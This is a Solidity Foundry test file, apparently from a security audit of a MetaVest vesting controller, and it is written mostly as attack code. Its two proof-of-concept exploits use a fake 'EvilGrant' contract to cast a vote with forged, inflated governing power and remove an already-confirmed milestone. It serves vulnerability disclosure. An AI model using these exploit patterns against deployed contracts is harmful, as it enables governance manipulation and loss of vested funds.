pragma solidity ^0.8.20;

import "forge-std/Test.sol";

import "../test/amendement.t.sol";

contract EvilGrant {

    function grantee () public view returns (address) {
        return address(0x31337);
    }
    function getGoverningPower() public view returns (uint256) {
        return 99999999999999999999999999999;
    }
}

contract Audit is MetaVestControllerTest {
    function testFailAuditArbitraryVote() public {
        // template from testVoteOnMetavestAmendment
        bytes4 msgSig = bytes4(keccak256("updateMetavestTransferability(address,bool)"));
        bytes memory callData = abi.encodeWithSelector(msgSig, address(mockAllocation), true);

        vm.prank(authority);
        controller.addMetaVestToSet("testSet", address(mockAllocation));

        vm.prank(authority);
        controller.proposeMajorityMetavestAmendment("testSet", msgSig, callData);

        address attacker = address(0x31337);
        address evil_grant = address(new EvilGrant());
        
        vm.prank(attacker);
        controller.voteOnMetavestAmendment(address(evil_grant), "testSet", msgSig, true);

        (uint256 totalVotingPower, uint256 currentVotingPower, , ,  ) = controller.functionToSetMajorityProposal(msgSig, "testSet");
        console.log("attacker made vote and power is" , currentVotingPower);
    }

    function testFailAuditRemoveConfirmedMilestone() public {
        // template from testRemoveMilestone
        address vestingAllocation = createDummyVestingAllocation();
        VestingAllocation(vestingAllocation).confirmMilestone(0);
        
        address[] memory addresses = new address[](1);
        addresses[0] = vestingAllocation;
        bytes4 selector = bytes4(keccak256("removeMetavestMilestone(address,uint256)"));
        bytes memory msgData = abi.encodeWithSelector(selector, vestingAllocation, 0);
        controller.proposeMetavestAmendment(vestingAllocation, controller.removeMetavestMilestone.selector, msgData);

        vm.prank(grantee);
        controller.consentToMetavestAmendment(vestingAllocation, controller.removeMetavestMilestone.selector, true);
        controller.removeMetavestMilestone(vestingAllocation, 0);
    }

}